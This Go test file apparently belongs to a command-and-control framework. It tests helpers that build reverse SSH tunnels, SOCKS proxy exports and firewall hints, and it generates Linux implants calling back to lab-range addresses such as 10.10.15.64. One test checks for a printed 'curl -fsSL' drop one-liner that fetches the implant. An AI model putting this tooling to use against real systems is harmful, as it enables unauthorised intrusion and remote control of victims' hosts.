package preimplant

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestTunnelArgs(t *testing.T) {
	_, err := TunnelArgs("", 8443, 8443)
	if err == nil {
		t.Fatal("empty target")
	}
	_, err = TunnelArgs("justahost", 8443, 8443)
	if err == nil {
		t.Fatal("need user@host")
	}
	got, err := TunnelArgs("nightfall@10.129.1.2", 8443, 8443)
	if err != nil {
		t.Fatal(err)
	}
	joined := strings.Join(got, " ")
	if !strings.Contains(joined, "ssh -N") || !strings.Contains(joined, "-R 8443:127.0.0.1:8443") {
		t.Fatalf("got %s", joined)
	}
	if got[len(got)-1] != "nightfall@10.129.1.2" {
		t.Fatalf("target %q", got[len(got)-1])
	}
	got, err = TunnelArgs("u@h", 9443, 10443)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(strings.Join(got, " "), "-R 10443:127.0.0.1:9443") {
		t.Fatalf("custom ports: %s", got)
	}
}

func TestEnvExports(t *testing.T) {
	s := EnvExports(1080)
	if !strings.Contains(s, "ALL_PROXY=socks5://127.0.0.1:1080") {
		t.Fatal(s)
	}
	if !strings.Contains(s, "ARK_PROXY=socks5://127.0.0.1:1080") {
		t.Fatal(s)
	}
	s = EnvExports(0)
	if !strings.Contains(s, ":1080") {
		t.Fatal("default port", s)
	}
}

func TestFormatStatusHints(t *testing.T) {
	out := FormatStatus(Status{
		HTTPS:     []string{"down 127.0.0.1:443"},
		GRPC:      []string{"down 127.0.0.1:50051"},
		HintPorts: []int{443},
	})
	if !strings.Contains(out, "ark teamserver") {
		t.Fatal("should hint teamserver when https down")
	}
	if !strings.Contains(out, "inbound tunnel") {
		t.Fatal("should hint tunnel")
	}
	if !strings.Contains(out, "inbound env") {
		t.Fatal("should hint socks env")
	}
	if !strings.Contains(out, "tun0") {
		t.Fatal(out)
	}
	if !strings.Contains(out, "--add-port=443/tcp") {
		t.Fatal("firewall hint should use config port")
	}
}

func TestLoadListenTargetsFromYAML(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "server.yaml")
	err := os.WriteFile(p, []byte("grpc_addr: 127.0.0.1:51111\nlisteners:\n  - name: https\n    protocol: https\n    host: 0.0.0.0\n    port: 9443\n"), 0o600)
	if err != nil {
		t.Fatal(err)
	}
	ports, grpc := loadListenTargets(p)
	if len(ports) != 1 || ports[0] != 9443 {
		t.Fatalf("ports %v", ports)
	}
	if grpc != "127.0.0.1:51111" {
		t.Fatalf("grpc %s", grpc)
	}
	s := CollectStatusFrom(p)
	if len(s.HTTPS) == 0 || !strings.Contains(s.HTTPS[0], ":9443") {
		t.Fatalf("status https %v", s.HTTPS)
	}
}

func TestLoadListenTargetsMissing(t *testing.T) {
	ports, grpc := loadListenTargets(filepath.Join(t.TempDir(), "nope.yaml"))
	if len(ports) != 2 || ports[0] != 1750 || ports[1] != 8443 {
		t.Fatalf("default ports %v", ports)
	}
	if grpc != "127.0.0.1:50051" {
		t.Fatalf("grpc %s", grpc)
	}
}

func TestFirewallAllowsPort(t *testing.T) {
	list := "8443/tcp 1714-1764/tcp 80/udp"
	if FirewallAllowsPort(list, 8443) != true {
		t.Fatal("8443")
	}
	if FirewallAllowsPort(list, 1750) != true {
		t.Fatal("1750 in 1714-1764")
	}
	if FirewallAllowsPort(list, 80) {
		t.Fatal("80 is udp only")
	}
	if FirewallAllowsPort(list, 22) {
		t.Fatal("22 closed")
	}
}

func TestFormatStatusMismatch(t *testing.T) {
	out := FormatStatus(Status{
		HTTPS:            []string{"up 10.10.15.64:8443"},
		HintPorts:        []int{8443},
		FirewallPorts:    "1714-1764/tcp",
		FirewallMismatch: []string{"8443/tcp"},
	})
	if !strings.Contains(out, "MISMATCH") || !strings.Contains(out, "8443/tcp") {
		t.Fatal(out)
	}
	if !strings.Contains(out, "--add-port=8443/tcp") {
		t.Fatal(out)
	}
	if !strings.Contains(out, "httpdrop") {
		t.Fatal(out)
	}
}

func TestHTTPDropFailClosed(t *testing.T) {
	orig := httpsListenUp
	httpsListenUp = func(int) bool { return false }
	t.Cleanup(func() { httpsListenUp = orig })
	err := RunInbound([]string{"httpdrop", "--callback", "https://10.10.15.64:1750", "--dir", t.TempDir()})
	if err == nil || !strings.Contains(err.Error(), "teamserver HTTPS down") {
		t.Fatalf("got %v", err)
	}
}

func TestHTTPDropGenerate(t *testing.T) {
	dir := t.TempDir()
	var seen []string
	origHTTPS, origLook, origRun, origPrint := httpsListenUp, lookARK, runArgv, HTTPDropPrint
	httpsListenUp = func(int) bool { return true }
	lookARK = func() (string, error) { return "/bin/ark", nil }
	runArgv = func(argv []string) error {
		seen = append(seen, strings.Join(argv, " "))
		return nil
	}
	var printed strings.Builder
	HTTPDropPrint = func(format string, a ...any) (int, error) {
		return fmt.Fprintf(&printed, format, a...)
	}
	t.Cleanup(func() {
		httpsListenUp, lookARK, runArgv, HTTPDropPrint = origHTTPS, origLook, origRun, origPrint
	})
	if err := RunInbound([]string{"httpdrop", "--callback", "https://10.10.15.64:1750", "--dir", dir, "--name", "i2"}); err != nil {
		t.Fatal(err)
	}
	joined := strings.Join(seen, "\n")
	if !strings.Contains(joined, "op generate") || !strings.Contains(joined, "--callback https://10.10.15.64:1750") {
		t.Fatalf("%s", joined)
	}
	out := printed.String()
	if !strings.Contains(out, "mkdir /tmp/i2.lockdir") || !strings.Contains(out, "curl -fsSL") {
		t.Fatalf("one-liner: %s", out)
	}
}

func TestHTTPDropListenBindError(t *testing.T) {
	dir := t.TempDir()
	origHTTPS, origLook, origRun, origPrint := httpsListenUp, lookARK, runArgv, HTTPDropPrint
	httpsListenUp = func(int) bool { return true }
	lookARK = func() (string, error) { return "/bin/ark", nil }
	runArgv = func(argv []string) error { return nil }
	HTTPDropPrint = func(format string, a ...any) (int, error) { return len(format), nil }
	t.Cleanup(func() {
		httpsListenUp, lookARK, runArgv, HTTPDropPrint = origHTTPS, origLook, origRun, origPrint
	})
	err := RunInbound([]string{"httpdrop", "--callback", "https://10.10.15.64:1750", "--dir", dir, "--listen", "not-an-addr"})
	if err == nil || !strings.Contains(err.Error(), "listen") {
		t.Fatalf("got %v", err)
	}
}

func TestRunInboundHelp(t *testing.T) {
	if err := RunInbound([]string{"help"}); err != nil {
		t.Fatal(err)
	}
}

func TestRunInboundUnknown(t *testing.T) {
	err := RunInbound([]string{"explode"})
	if err == nil || !strings.Contains(err.Error(), "unknown inbound") {
		t.Fatalf("got %v", err)
	}
}

func TestRunInboundEnvPort(t *testing.T) {
	if err := RunInbound([]string{"env", "--port", "9050"}); err != nil {
		t.Fatal(err)
	}
	err := RunInbound([]string{"env", "--port", "nope"})
	if err == nil {
		t.Fatal("bad port")
	}
}

func TestBackgroundTunnelArgs(t *testing.T) {
	got, err := BackgroundTunnelArgs("nightfall@10.129.1.2", 8443, 8443, "/tmp/in.sock")
	if err != nil {
		t.Fatal(err)
	}
	joined := strings.Join(got, " ")
	if !strings.Contains(joined, "ssh -f -N") {
		t.Fatalf("want -f -N: %s", joined)
	}
	if !strings.Contains(joined, "ControlMaster=yes") || !strings.Contains(joined, "ControlPath=/tmp/in.sock") {
		t.Fatalf("control: %s", joined)
	}
	if !strings.Contains(joined, "-R 8443:127.0.0.1:8443") {
		t.Fatalf("fwd: %s", joined)
	}
	if _, err := BackgroundTunnelArgs("no-at", 8443, 8443, ""); err == nil {
		t.Fatal("need user@host")
	}
}

func TestCloseAndCheckArgs(t *testing.T) {
	c := CloseTunnelArgs("u@h", "/tmp/x.sock")
	if strings.Join(c, " ") != "ssh -O exit -o ControlPath=/tmp/x.sock u@h" {
		t.Fatalf("%v", c)
	}
	k := MasterCheckArgs("u@h", "/tmp/x.sock")
	if strings.Join(k, " ") != "ssh -O check -o ControlPath=/tmp/x.sock u@h" {
		t.Fatalf("%v", k)
	}
}

func TestGenerateAndSocksArgs(t *testing.T) {
	g := GenerateArgs("/bin/ark", "https://127.0.0.1:8443", "/tmp/imp")
	joined := strings.Join(g, " ")
	if !strings.Contains(joined, "op generate") || !strings.Contains(joined, "--language c") {
		t.Fatalf("%s", joined)
	}
	if !strings.Contains(joined, "--os linux") || !strings.Contains(joined, "--callback https://127.0.0.1:8443") {
		t.Fatalf("%s", joined)
	}
	s := SocksStartArgs("/bin/ark", 1080, "abc")
	if strings.Join(s, " ") != "/bin/ark op socks start --port 1080 --session abc" {
		t.Fatalf("%v", s)
	}
}

func TestControlPathShort(t *testing.T) {
	p := ControlPath("user@10.129.1.2")
	if !strings.Contains(p, "in-") || !strings.HasSuffix(p, ".sock") {
		t.Fatalf("%s", p)
	}
	if len(p) > 100 {
		t.Fatalf("socket path too long: %d %s", len(p), p)
	}
}

func TestInboundDropFailClosed(t *testing.T) {
	orig := httpsListenUp
	httpsListenUp = func(int) bool { return false }
	t.Cleanup(func() { httpsListenUp = orig })
	err := RunInbound([]string{"drop", "u@h"})
	if err == nil || !strings.Contains(err.Error(), "teamserver HTTPS down") {
		t.Fatalf("got %v", err)
	}
}

func TestInboundDropUsesGenerateNotMake(t *testing.T) {
	var seen [][]string
	origHTTPS, origLook, origRun := httpsListenUp, lookARK, runArgv
	httpsListenUp = func(int) bool { return true }
	lookARK = func() (string, error) { return "/bin/ark", nil }
	runArgv = func(argv []string) error {
		seen = append(seen, append([]string{}, argv...))
		return nil
	}
	t.Cleanup(func() {
		httpsListenUp, lookARK, runArgv = origHTTPS, origLook, origRun
	})
	if err := RunInbound([]string{"drop", "walter@10.129.1.2", "--out", "/tmp/imp"}); err != nil {
		t.Fatal(err)
	}
	var gen []string
	for _, a := range seen {
		j := strings.Join(a, " ")
		if strings.Contains(j, "op generate") {
			gen = a
		}
		if strings.Contains(j, "make") {
			t.Fatalf("must not call make: %s", j)
		}
	}
	if gen == nil {
		t.Fatalf("no generate in %v", seen)
	}
	joined := strings.Join(gen, " ")
	if !strings.Contains(joined, "--callback https://127.0.0.1:8443") {
		t.Fatalf("%s", joined)
	}
}
